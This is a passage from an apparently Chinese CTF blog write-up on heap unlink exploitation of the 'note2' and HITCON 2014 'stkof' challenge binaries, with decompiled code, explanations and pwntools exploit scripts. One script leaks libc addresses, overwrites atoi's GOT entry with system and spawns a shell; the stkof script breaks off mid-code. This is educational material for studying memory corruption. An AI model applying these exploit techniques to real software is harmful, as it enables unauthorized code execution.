输出提示信息<ul><li>选择overwrite或者append但是不会超过所记录的size，并且读取后也会排除%    </li><li>之后直接free(tmp_chunk) 但其大小是0xa0    </li></ul></li><li>delete：bss_ptr_chunk置零   bss_size置零</li></ul><h3 id="add无限读取"><a href="#add无限读取" class="headerlink" title="add无限读取"></a>add无限读取</h3><pre class=" language-c"><code class="language-c">a2：<span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_4009BD</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">,</span> <span class="token keyword">char</span> a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-34h]</span>  <span class="token keyword">char</span> buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Fh] [rbp-11h]</span>  <span class="token keyword">unsigned</span> __int64 i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-10h]</span>  ssize_t v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-8h]</span>  v4 <span class="token operator">=</span> a3<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span> a2 <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">></span> i<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>              <span class="token comment" spellcheck="true">// 读取a2-1次</span>  <span class="token punctuation">{</span>    v7 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>buf<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> buf <span class="token operator">==</span> v4 <span class="token punctuation">)</span>                            <span class="token comment" spellcheck="true">// 判断\n</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> a1<span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                       <span class="token comment" spellcheck="true">// 最后截断</span>  <span class="token keyword">return</span> i<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传进来的a2是unsigned int类型那么，a2-1根据类型转换，低精度转向高精度(unsigned int能表示的数更大)所以，a2-1的类型是unsigned int，那么如果我们的a2==0<br>则a2-1==-1 ====&gt; 0xfffffff(unsigned int) 所以这个时候就可以无限循环读取。真滴膜拜那些大佬~<br><strong>所以我们只要add(0) 会分配一个chunk(0x20) 而我们随时可以用edit输入任意数量的字符串，达到覆盖的目的，而在堆中覆盖就是个爸爸</strong></p><p>数据分布：<br><img src="https://s1.ax1x.com/2020/10/18/0XaeEt.png" alt=""></p><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><pre class=" language-c"><code class="language-c">            <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> chunk_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>          v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0xA0uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          tmp_chunk <span class="token operator">=</span> v0<span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v0 <span class="token operator">=</span> <span class="token string">'oCweNehT'</span><span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">':stnetn'</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span>tmp_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// fmtstr</span>          <span class="token function">read_buf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token punctuation">(</span>tmp_chunk <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x90LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">fugai</span><span class="token punctuation">(</span>tmp_chunk <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v1 <span class="token operator">=</span> tmp_chunk<span class="token punctuation">;</span>          v1<span class="token punctuation">[</span>chunk_size <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 保证不会溢出</span>          <span class="token function">strncat</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dest<span class="token punctuation">,</span> tmp_chunk <span class="token operator">+</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">0xFFFFFFFFFFFFFFFFLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">strcpy</span><span class="token punctuation">(</span>chunk_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">free</span><span class="token punctuation">(</span>tmp_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Edit note success!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>在分析这里的实现原理花了太长的时间了，虽然搞懂了，我还一直关注那个printf(tmp_chunk)fmtstr漏洞我以为这里会是突破口，但也不是不可能吧只是本人太菜了<br>或也许真的没必要。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>思路是人家的~，我能提取到的主要是这个：在这里bss段放的是chunk指针，而程序bss地址固定，就相当于我们有一个<strong>二级指针最终指向chunk p 这正好就是我们在unlink利用上的那个条件，所以最终如果实现</strong><br>利用我们可以让这个<strong>二级指针指向自己地址-0x18</strong>，通过edit和show功能我们就可以修改bss段上的指针信息，实现任意地址读与写，任意地址的读写应该就是堆题里面的大爷了(doge)**</p><h4 id="思路-1"><a href="#思路-1" class="headerlink" title="~思路"></a>~思路</h4><ul><li>构造三个 chunk，malloc(0x80)、malloc(0)和 malloc(0x80)<ul><li>chunk0要进行Fakechunk构造来准备unlink，因为咱们改不了他的size字段</li><li>Fake_chunk的head组成为：p64(unkown) + p64(0x91)</li></ul></li><li>释放malloc(0),再malloc(0)这样后面放的是malloc(0x80)，就可以覆盖了</li><li>释放chunk2，在修改后的prev_size和size字段的加持下，会与Fakechunk合并，使得Fakechunk发生unlink</li></ul><p>数据分布：<br>malloc(0x80)、malloc(0)和 malloc(0x80)<br><img src="https://s1.ax1x.com/2020/10/18/0Xan4f.png" alt=""><br>覆盖操作:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># edit the chunk1 to overwrite the chunk2</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>newnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span></code></pre><p>数据分布：<br><img src="https://s1.ax1x.com/2020/10/18/0XamUP.png" alt=""><br>这时free掉chunk2就会根据prev_size和size追踪到Fake_chunk来进行合并操作，而引发Fakechunk的unlink。</p><p>最终使得：</p><pre class=" language-java"><code class="language-java"><span class="token punctuation">.</span>bss<span class="token operator">:</span><span class="token number">0000000000602120</span> bss_ptr_chunk   dq <span class="token operator">?</span> </code></pre><p>指向0000000000602120 -0x18.然后我们edit chunk0的时候就是在0000000000602120 -0x18上面写数据了<br>我们可以再次覆盖bss_ptr_chunk为got地址，然后用show泄露地址，计算出system地址后再用edit向该got地址覆盖为system，像这么友好的got不用我说你也应该知道(atoi)</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++note2.py++++++++++++++++++++</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span><span class="token comment" spellcheck="true">#Author: Squarer</span><span class="token comment" spellcheck="true">#Time: Sat Oct 17 21:27:05 CST 2020</span><span class="token comment" spellcheck="true">#+++++++++++++++++++note2.py++++++++++++++++++++</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token keyword">def</span> <span class="token function">newnote</span><span class="token punctuation">(</span>length<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option--->>\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'(less than 128)\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the note content:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option--->>\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the id of the note:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>choice<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option--->>\n'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the id of the note:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'[1.overwrite/2.append]\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'TheNewContents:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'option--->>\n'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the id of the note:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./note2'</span><span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./note2'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#sh = remote('ip',port)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your name:\n'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input your address:\n'</span><span class="token punctuation">,</span><span class="token string">'test'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># chunk0: a fake chunk</span>ptr <span class="token operator">=</span> <span class="token number">0x0000000000602120</span>  <span class="token comment" spellcheck="true">#bss_ptr_chunk</span>fakefd <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x18</span>fakebk <span class="token operator">=</span> ptr <span class="token operator">-</span> <span class="token number">0x10</span>content <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fakefd<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fakebk<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x60</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#content = p64(fakefd) + p64(fakebk)</span>newnote<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># chunk1: a zero size chunk produce overwrite</span>newnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># chunk2: a chunk to be overwrited and freed</span>newnote<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token string">'b'</span> <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># edit the chunk1 to overwrite the chunk2</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>content <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>newnote<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># delete note 2 to trigger the unlink</span><span class="token comment" spellcheck="true"># after unlink, ptr[0] = ptr - 0x18</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># overwrite the chunk0(which is ptr[0]) with got atoi</span>atoi_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>content <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>atoi_got<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'is '</span><span class="token punctuation">)</span>atoi_addr <span class="token operator">=</span> sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">print</span> atoi_addratoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'leak atoi addr: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># get system addr</span>atoi_offest <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span>libcbase <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> atoi_offestsystem_offest <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> system_offest<span class="token keyword">print</span> <span class="token string">'leak system addr: '</span><span class="token punctuation">,</span> hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># overwrite the atoi got with systemaddr</span>content <span class="token operator">=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># get shell</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'option--->>'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><h3 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h3><pre class=" language-java"><code class="language-java">matrix<span class="token annotation punctuation">@ubuntu</span><span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>PWN<span class="token operator">/</span>how2heap<span class="token operator">/</span>wiki_heap<span class="token operator">/</span>unlink$ checksec stkof<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/how2heap/wiki_heap/unlink/stkof'</span>    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little    RELRO<span class="token operator">:</span>    Partial RELRO    Stack<span class="token operator">:</span>    Canary found    NX<span class="token operator">:</span>       NX enabled    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span></code></pre><p>PIE保护关闭</p><h3 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h3><pre class=" language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-74h]</span>  <span class="token keyword">char</span> nptr<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-70h]</span>  <span class="token keyword">unsigned</span> __int64 v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-8h]</span>  v7 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    choice <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v5 <span class="token operator">=</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token comment" spellcheck="true">// size无限制</span>      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">></span> <span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment" spellcheck="true">// 指针置零</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> <span class="token function">unkwon</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v5 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// malloc(size),该指针放在bss段上</span>      <span class="token keyword">goto</span> LABEL_14<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v5 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>LABEL_14<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"FAIL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里没有像其他菜单题一样选项提示明显，但还是一个菜单题</p><ul><li>choice1：add malloc(size) 并将指针记录在bss段上</li><li>choice2：对某个chunk内容改写，但是size是无限制的，存在堆溢出漏洞</li><li>choice3：free某个chunk并且将bss的对应记录清除</li></ul><p><strong>这里注意：执行fgets函数，以及add中的printf都会默认调用malloc来分配一块内存作为缓冲区，像这样的搅屎棍最好提前给他们分配好</strong></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p><strong>由于bss段存放chunk指针，程序存在堆溢出漏洞我们可以使用unlink来使得chunk指针指向自己的bss段，从而用edit修改bss段数据(chunk指针)实现任意地址读写</strong><br><img src="https://s1.ax1x.com/2020/10/18/0XaVHI.png" alt=""></p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++stkof.py++++++++++++++++++++</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span><span class="token comment" spellcheck="true">#Author: Squarer</span><span class="token comment" spellcheck="true">#Time: Sun Oct 18 10:52:12 CST 2020</span><span class="token comment" spellcheck="true">#+++++++++++++++++++stkof.py++++++++++++++++++++</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#libc = ELF('')</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#choice 1</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>new_size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#choice 2</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>new_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./stkof'</span><span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node3.buuoj.cn'</span><span class="token punctuation">,</span><span class="token number">27508</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#for cache</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#chunk2 chunk3 chunk4</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#prevent consolidate</span>bss_ptr_chunk <span class="token operator">=</span> <span class="token number">0x602150</span>fake_head <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span>fake_fd <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss_ptr_chunk <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span>fake_bk <span class="token operator">=</span> p64<span class="token punctuation">(</span>bss_ptr_chunk <span class="token operator">-</span> <span class="token 